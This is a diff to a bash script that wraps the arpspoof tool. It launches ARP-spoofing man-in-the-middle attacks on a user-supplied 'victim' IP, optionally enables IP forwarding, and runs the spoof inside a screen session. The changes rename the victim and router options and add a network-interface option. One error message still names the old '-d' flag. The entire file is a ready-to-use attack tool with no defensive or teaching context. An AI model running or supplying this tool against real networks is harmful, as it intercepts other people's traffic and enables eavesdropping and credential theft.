@@ -1,40 +1,55 @@
 #!/usr/bin/env bash
 
+#===============================================================================================
+# System required: Linux
+# Packages required: arpspoof
+# Description: Bundles several man-in-the-middle scripts.
+# Author: dsfranzi
+#===============================================================================================
+
 RCFILE="/tmp/arpspoofex.rc"
 
-while getopts "hnd:s:" opt 
+while getopts "hnv:r:i:" opt 
 do
 	case $opt in
 		h)	# Help
 			echo "Usage:"
-			echo "$0 [options] <-d Victim IP Address>"
+			echo "$0 [options] <-v Victim IP Address>"
 			echo ""
 			echo "Required Options"
-			echo -e "-d <IP Address>\t\tDestination IP Address"
+			echo -e "-v <IP Address>\t\tDestination IP Address"
 			echo ""
 			echo "Options"
 			echo -e "-h\t\t\tHelp"
+			echo -e "-i <Interface>\t\tInterface"
 			echo -e "-n\t\t\tNo Forwarding"
-			echo -e "-s <IP Address>\t\tSource IP Address."
-			echo -e "\t\t\tDefaults to the Gateway IP Address if not set."
+			echo -e "-r <IP Address>\t\tRouter IP Address."
+			echo -e "\t\t\tStandard: the default gateway IP address if not set."
 			exit 1
+		;;
+		i)	# Interface
+			INTERFACE=$OPTARG
 		;;
 		n)	# No Forwarding
 			NOFORWARD=true
 		;;
-		d)	# Destination
+		v)	# Destination
 			VICTIM=$OPTARG
 		;;
-		s)	# Source
+		r)	# Router
 			GATEWAY=$OPTARG
 		;;
 	esac
 done
 
 # Requirements
-if [ -z "$VICTIM" ] 
+if [ -z "$VICTIM" ]
 then
 	echo "-d Argument not provided."
+	exit 1
+elif [ -z "$INTERFACE" ]
+then
+	echo "-i Argument not provided."
 	exit 1
 fi
 
@@ -61,7 +76,7 @@ echo $FORWARD > /proc/sys/net/ipv4/ip_forward
 
 echo "startup_message off" > $RCFILE
 echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
-echo -e "screen -t arpspoof arpspoof -r -t $GATEWAY $VICTIM" >> $RCFILE
+echo -e "screen -t arpspoof arpspoof -i $INTERFACE -r -t $GATEWAY $VICTIM" >> $RCFILE
 echo -e "screen -r -t Main" >> $RCFILE
 
 screen -c $RCFILE
